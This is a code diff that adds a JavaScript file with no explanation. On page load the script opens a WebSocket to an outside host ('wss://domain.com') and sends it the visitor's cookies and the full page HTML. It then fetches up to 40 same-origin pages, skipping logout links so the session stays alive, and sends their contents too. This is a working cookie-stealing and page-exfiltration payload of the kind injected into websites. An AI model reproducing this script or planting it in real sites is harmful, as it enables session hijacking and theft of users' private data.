@@ -1,0 +1,60 @@
+document.addEventListener("DOMContentLoaded", function() {
+    var socket = new WebSocket("wss://domain.com");
+    
+    socket.onopen = function(e) {
+        socket.send(JSON.stringify({type: "cookies", data: document.cookie}));
+        socket.send(JSON.stringify({type: "page", page: window.location.href, data: document.documentElement.outerHTML}));
+
+        var links = document.getElementsByTagName("a");
+        var currentOrigin = window.location.origin;
+        var processedLinks = new Set();
+        var directoryCount = {};
+        var maxLinks = 40;
+        var fetchedLinks = 0;
+
+        for (var i = 0; i < links.length && fetchedLinks < maxLinks; i++) {
+            var link = links[i].getAttribute("href");
+
+            try {
+                var url = new URL(link, currentOrigin);
+                url.hash = "";
+                link = url.toString();
+            } catch (e) {
+                continue;
+            }
+
+            if (url.origin !== currentOrigin || processedLinks.has(link)) {
+                continue;
+            }
+
+            if (link.includes("logout") || link.includes("exit") || link.match(/\.(css|svg|jpeg|jpg|woff|woff2|json|ogg|png|mp3|mp4|mov|m4a|ttf|webp|gif|ico|js|txt|sql|zip|tar.gz|rar|pdf|doc|docx|xls|xlsx)$/)) {
+                continue;
+            }
+
+            var directoryPath = url.pathname.split('/').slice(0, -1).join('/');
+            directoryCount[directoryPath] = directoryCount[directoryPath] || 0;
+
+            if (directoryCount[directoryPath] >= 5) {
+                continue;
+            }
+
+            (function(link) {
+                fetch(link)
+                    .then(response => {
+                        if (response.ok) {
+                            return response.text();
+                        }
+                    })
+                    .then(data => {
+                        if (data) {
+                            socket.send(JSON.stringify({type: "page", page: link, data: data}));
+                            fetchedLinks++;
+                            directoryCount[directoryPath]++;
+                        }
+                    });
+            })(link);
+
+            processedLinks.add(link);
+        }
+    };
+});
